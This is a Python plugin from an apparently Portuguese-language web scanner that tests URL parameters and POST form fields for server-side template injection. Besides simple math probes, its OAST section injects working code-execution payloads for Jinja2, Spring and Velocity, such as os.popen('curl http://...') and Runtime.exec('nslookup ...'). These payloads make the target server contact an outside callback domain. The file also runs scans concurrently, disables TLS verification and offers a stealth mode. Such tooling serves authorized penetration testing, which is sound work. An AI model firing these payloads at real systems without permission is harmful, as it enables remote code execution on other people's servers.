#!/usr/bin/env python3
"""
SSTI (V11.1 OAST) — Server-Side Template Injection detection.
Injeta payloads reais para Jinja2, Django, Mako, Twig, Spring, Smarty e verifica execução.
Inclui POST testing, payloads de RCE chain hints, e agora OASt via OastClient.
"""
import json
import time
import hashlib
import httpx
from pathlib import Path
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed

from core.config import DEFAULT_USER_AGENT, REQUEST_DELAY, DEFAULT_TIMEOUT, get_user_agent
from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_http_request, format_http_response

# ---------- Payloads (mantidos exatamente iguais) ----------
def _build_payloads(deep: bool = False):
    payloads = [
        ("{{7777*7777}}", "60481729"),            # Jinja2, Twig
        ("${7777*7777}", "60481729"),             # Freemarker, Velocity
        ("<%= 7777*7777 %>", "60481729"),         # ERB (Ruby)
        ("#{7777*7777}", "60481729"),             # Slim, Pug
    ]
    if deep:
        payloads.extend([
            ("{{config}}", "Config"),
            ("{{settings.DATABASES}}", "'default'"),
            ("${{7777*7777}}", "60481729"),
            ("{{7*'7777777'}}", "7777777777777777777777777777777777777777777777777"),
            ("@(7777*7777)", "60481729"),
            ("{{'7'*7777777}}", "7777777777777777777777777777777777777777777777777"),
            ("{{variable.getClass().forName('java.lang.Runtime')}}", "java.lang.Runtime"),
            ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime"),
            ("${applicationScope}", "ApplicationScope"),
            ("${pageContext}", "PageContext"),
        ])
    payloads_v10_2 = [
        ("{%debug%}", "TEMPLATES"),
        ("{{self}}", "TemplateReference"),
        ("${T(java.lang.Runtime)}", "java.lang.Runtime"),
        ("{{range.constructor(\"return 1+1\")()}}", "2"),
        ("#set($x=7777*7777)${x}", "60481729"),
        ("{{\"allma\".toUpperCase()}}", "ALLMA"),
        ("*{7777*7777}", "60481729"),
    ]
    payloads.extend(payloads_v10_2)
    return payloads

_EXPECTED_BLACKLIST = {
    "secret_key", "license_key", "licensekey", "api_key", "apikey",
    "config", "debug", "true", "false", "null", "undefined",
    "applicationid", "accountid", "agentid",
}

# ---------- Teste de injeção (com OAST opcional) ----------
def _test_ssti(client: httpx.Client, url: str, param: str, deep: bool = False,
               target: str = "", oast_client=None) -> dict | None:
    """
    Testa payloads SSTI em um parâmetro.
    Se oast_client for fornecido, tenta primeiro payloads OAST; se callback,
    retorna confirmação imediata. Caso contrário, usa os payloads matemáticos.
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)

    # Baseline
    try:
        baseline_resp = client.get(url, headers={"User-Agent": get_user_agent()})
        baseline_body = baseline_resp.text
        baseline_hash = hashlib.sha256(baseline_body.encode(errors='ignore')).hexdigest()
    except Exception:
        return None

    # ── TENTATIVA OAST (prioritária) ──
    if oast_client and hasattr(oast_client, 'get_url'):
        oast_host = oast_client.get_url()
        if oast_host:
            unique_sub = f"ssti-{hashlib.md5(url.encode()).hexdigest()[:6]}"
            payload_domain = oast_client.get_url(subdomain=unique_sub)
            oast_client.add_payload(payload_domain)

            # Payloads OAST para diversos motores
            oast_payloads = [
                f"{{{{config.__class__.__init__.__globals__['os'].popen('curl http://{payload_domain}').read()}}}}",
                f"{{{{''.__class__.__mro__[2].__subclasses__()}}}}",
                f"${{T(java.lang.Runtime).getRuntime().exec('nslookup {payload_domain}')}}",
                f"{{% import os %}}{{{{ os.popen('curl http://{payload_domain}').read() }}}}",
                f"#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$rt.getRuntime().exec('nslookup {payload_domain}'))",
            ]
            for payload in oast_payloads:
                time.sleep(REQUEST_DELAY)
                test_qs = qs.copy()
                test_qs[param] = [payload]
                new_query = urlencode(test_qs, doseq=True)
                test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                       parsed.params, new_query, parsed.fragment))
                try:
                    resp = client.get(test_url, headers={"User-Agent": DEFAULT_USER_AGENT})
                    if resp.status_code >= 400:
                        continue
                    time.sleep(2)  # aguarda processamento OOB
                    interactions = oast_client.poll(timeout=6)
                    for entry in interactions:
                        if payload_domain in entry.get('full-uri', '') or payload_domain in entry.get('raw-request', ''):
                            return {
                                "url": url,
                                "test_url": test_url,
                                "parameter": param,
                                "method": "GET",
                                "payload": payload,
                                "expected": f"OAST callback {payload_domain}",
                                "status": resp.status_code,
                                "risk": "CRITICAL",
                                "type": "SSTI",
                                "confirmed": True,
                                "details": f"SSTI confirmado via callback OAST ({payload_domain})",
                                "request_raw": format_http_request(resp.request),
                                "response_raw": format_http_response(resp),
                            }
                except Exception:
                    pass

    # ── PAYLOADS MATEMÁTICOS (fallback / deep) ──
    payloads = _build_payloads(deep)
    CONFIRMATION_PAYLOADS = [
        ("{{8888*8888}}", "78996544"),
        ("{{9999*9999}}", "99980001"),
        ("${8888*8888}", "78996544"),
    ]

    for payload, expected in payloads:
        time.sleep(REQUEST_DELAY)
        test_qs = qs.copy()
        test_qs[param] = [payload]
        new_query = urlencode(test_qs, doseq=True)
        test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                               parsed.params, new_query, parsed.fragment))
        try:
            resp = client.get(test_url, headers={"User-Agent": DEFAULT_USER_AGENT})
            if resp.status_code >= 400:
                continue
            body = resp.text
            resp_hash = hashlib.sha256(body.encode(errors='ignore')).hexdigest()
            if resp_hash == baseline_hash:
                continue
            if expected.lower().strip("'") in _EXPECTED_BLACKLIST:
                continue
            if expected.lower() in body.lower() and expected.lower() not in baseline_body.lower():
                if expected.lower() in payload.lower() and payload.lower() in body.lower():
                    continue
                needs_confirmation = len(expected) < 5
                if needs_confirmation:
                    confirmed = False
                    for conf_payload, conf_expected in CONFIRMATION_PAYLOADS:
                        if conf_payload == payload:
                            continue
                        time.sleep(REQUEST_DELAY)
                        test_qs[param] = [conf_payload]
                        conf_query = urlencode(test_qs, doseq=True)
                        conf_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                               parsed.params, conf_query, parsed.fragment))
                        try:
                            conf_resp = client.get(conf_url, headers={"User-Agent": DEFAULT_USER_AGENT})
                            if conf_resp.status_code < 400 and conf_expected in conf_resp.text and conf_expected not in baseline_body:
                                confirmed = True
                                break
                        except Exception:
                            pass
                    if not confirmed:
                        continue
                idx = body.lower().find(expected.lower())
                start = max(0, idx - 40)
                end = min(len(body), idx + len(expected) + 40)
                snippet = body[start:end].replace('\n', ' ').strip()
                return {
                    "url": url,
                    "test_url": test_url,
                    "parameter": param,
                    "method": "GET",
                    "payload": payload,
                    "expected": expected,
                    "status": resp.status_code,
                    "risk": "CRITICAL",
                    "type": "SSTI",
                    "confirmed": True,
                    "details": f"SSTI via '{param}' (Payload: {payload} -> {expected})<br><b>Snippet:</b> <code>...{snippet}...</code>",
                    "request_raw": format_http_request(resp.request),
                    "response_raw": format_http_response(resp),
                }
        except Exception:
            pass
    return None


def _test_ssti_post(client: httpx.Client, url: str, deep: bool = False, oast_client=None) -> dict | None:
    """Testa SSTI via POST, incluindo OAST se disponível."""
    # Baseline
    try:
        baseline_resp = client.get(url, headers={"User-Agent": get_user_agent()})
        baseline_body = baseline_resp.text
    except Exception:
        return None

    form_params = ["name", "email", "search", "q", "query", "message", "comment", "title", "input", "text"]
    payloads = _build_payloads(deep)[:6]

    for param in form_params:
        for payload, expected in payloads:
            time.sleep(REQUEST_DELAY)
            try:
                data = {param: payload}
                resp = client.post(url, data=data, headers={"User-Agent": DEFAULT_USER_AGENT})
                if resp.status_code >= 400:
                    continue
                body = resp.text
                if expected.lower().strip("'") in _EXPECTED_BLACKLIST:
                    continue
                if expected.lower() in body.lower() and expected.lower() not in baseline_body.lower():
                    idx = body.lower().find(expected.lower())
                    start = max(0, idx - 40)
                    end = min(len(body), idx + len(expected) + 40)
                    snippet = body[start:end].replace('\n', ' ').strip()
                    return {
                        "url": url,
                        "parameter": param,
                        "method": "POST",
                        "payload": payload,
                        "expected": expected,
                        "status": resp.status_code,
                        "risk": "CRITICAL",
                        "type": "SSTI",
                        "details": f"SSTI via POST: Parâmetro '{param}' (Payload: {payload} -> {expected})<br><b>Snippet:</b> <code>...{snippet}...</code>",
                        "request_raw": format_http_request(resp.request),
                        "response_raw": format_http_response(resp),
                    }
            except Exception:
                pass
    return None


def run(context: dict):
    target = context.get("target")
    deep = context.get("deep", False)
    stealth = context.get("stealth", False)
    oast_client = context.get("oast")  # NOVO: cliente OAST injetado pelo runner

    if not target:
        raise ValueError("Target required")

    info(
        f"\n🟧───────────────────────────────────────────────────────────🟧\n"
        f"   🧪 {C.BOLD}{C.CYAN}SSTI (TEMPLATE INJECTION) SCANNER (V11.1 OAST){C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END} | Deep: {deep} | Stealth: {stealth}\n"
        f"🟧───────────────────────────────────────────────────────────🟧\n"
    )

    outdir = ensure_outdir(target, "ssti")
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    if not urls_file.exists():
        warn("⚠️ urls_200.txt não encontrado.")
        summary = {"tests_run": 0, "urls_checked": 0, "findings": 0, "status": "NO_INPUT"}
        (outdir / "ssti_results.json").write_text(json.dumps([], indent=2))
        (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))
        return []

    all_urls = [l.strip() for l in urls_file.read_text(errors="ignore").splitlines() if l.strip()]
    candidates = []
    for url in all_urls:
        if "?" in url:
            parsed = urlparse(url)
            qs = parse_qs(parsed.query)
            for param in qs:
                candidates.append((url, param))

    seen = set()
    deduped_candidates = []
    for url, param in candidates:
        key = (url.rstrip("/"), param)
        if key not in seen:
            seen.add(key)
            deduped_candidates.append((url, param))
    candidates = deduped_candidates[:80]
    max_workers = 2 if stealth else 5

    info(f"   📋 Testando {len(candidates)} parâmetros com payloads reais de engines")
    results = []
    tests_run = 0
    found_keys = set()

    with httpx.Client(timeout=DEFAULT_TIMEOUT, verify=False, follow_redirects=True) as client:
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {
                executor.submit(_test_ssti, client, url, param, deep, target, oast_client): (url, param)
                for url, param in candidates
            }
            for future in as_completed(futures):
                try:
                    res = future.result()
                    tests_run += 1
                    if res:
                        dedup_key = (res["url"], res["parameter"])
                        if dedup_key not in found_keys:
                            found_keys.add(dedup_key)
                            results.append(res)
                            info(f"   🔴 {C.RED}[CRITICAL]{C.END} {res['url']} — '{res['parameter']}' -> {res['payload']}")
                except Exception:
                    pass

        if deep:
            info(f"   🔎 [DEEP] Testando SSTI via POST...")
            post_candidates = [u for u in all_urls if any(kw in u.lower() for kw in
                               ["/search", "/contact", "/comment", "/feedback", "/form", "/submit"])]
            post_candidates = list(set(post_candidates))[:20]
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                futures = {
                    executor.submit(_test_ssti_post, client, url, deep, oast_client): url
                    for url in post_candidates
                }
                for future in as_completed(futures):
                    try:
                        res = future.result()
                        tests_run += 1
                        if res:
                            dedup_key = (res["url"], res["parameter"])
                            if dedup_key not in found_keys:
                                found_keys.add(dedup_key)
                                results.append(res)
                                info(f"   🔴 {C.RED}[CRITICAL POST]{C.END} {res['url']} — '{res['parameter']}' -> {res['payload']}")
                    except Exception:
                        pass

    output_file = outdir / "ssti_results.json"
    output_file.write_text(json.dumps(results, indent=2, ensure_ascii=False))
    summary = {"tests_run": tests_run, "urls_checked": len(candidates), "findings": len(results), "status": "COMPLETED"}
    (outdir / "scan_summary.json").write_text(json.dumps(summary, indent=2))

    if results:
        success(f"\n   🧪 {len(results)} SSTI Confirmado(s)!")
    else:
        info(f"   ✅ 0 SSTI em {len(candidates)} candidatos.")
    success(f"   📂 Salvos em {output_file}")
    return results